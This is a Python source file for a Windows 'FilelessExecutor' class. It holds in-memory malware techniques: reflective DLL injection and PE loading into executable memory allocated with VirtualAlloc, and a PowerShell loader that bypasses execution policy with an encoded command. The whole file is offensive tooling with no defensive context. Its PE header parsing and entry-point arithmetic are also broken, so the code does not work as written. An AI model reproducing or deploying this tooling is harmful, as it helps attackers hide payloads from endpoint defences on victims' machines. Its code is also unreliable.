import ctypes
import ctypes.wintypes
import subprocess
import base64

class FilelessExecutor:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.loaded_modules = []
        
    def reflective_dll_injection(self, dll_data):
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
        
        module_base = self.kernel32.VirtualAlloc(
            None, len(dll_data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )
        
        if not module_base:
            return False
            
        ctypes.memmove(module_base, dll_data, len(dll_data))
        
        dos_header = ctypes.cast(module_base, ctypes.POINTER(ctypes.c_uint64))
        nt_headers = (module_base + dos_header[15])
        
        entry_point = nt_headers + 24 + 16
        entry_func = ctypes.cast(entry_point, ctypes.WINFUNCTYPE(ctypes.c_bool))
        
        if entry_func():
            self.loaded_modules.append(module_base)
            return True
        return False
        
    def powershell_memory_loader(self, script):
        try:
            b64_script = base64.b64encode(script.encode()).decode()
            powershell_cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {b64_script}'
            
            proc = subprocess.Popen(
                powershell_cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            proc.wait()
            return proc.returncode == 0
        except:
            return False
            
    def load_pe_from_memory(self, pe_data):
        dos_header = ctypes.cast(pe_data, ctypes.POINTER(ctypes.c_uint16))
        if dos_header[0] != 0x5A4D:
            return False
            
        nt_headers = ctypes.cast(
            pe_data + dos_header[15],
            ctypes.POINTER(ctypes.c_uint32)
        )
        
        size_of_image = nt_headers[11]
        image_base = nt_headers[13]
        
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
        
        image_mem = self.kernel32.VirtualAlloc(
            image_base, size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )
        
        if not image_mem:
            return False
            
        ctypes.memmove(image_mem, pe_data, len(pe_data))
        
        entry_point = nt_headers + 16
        entry = ctypes.cast(
            image_mem + entry_point,
            ctypes.WINFUNCTYPE(ctypes.c_int)
        )
        
        entry()
        self.loaded_modules.append(image_mem)
        return True
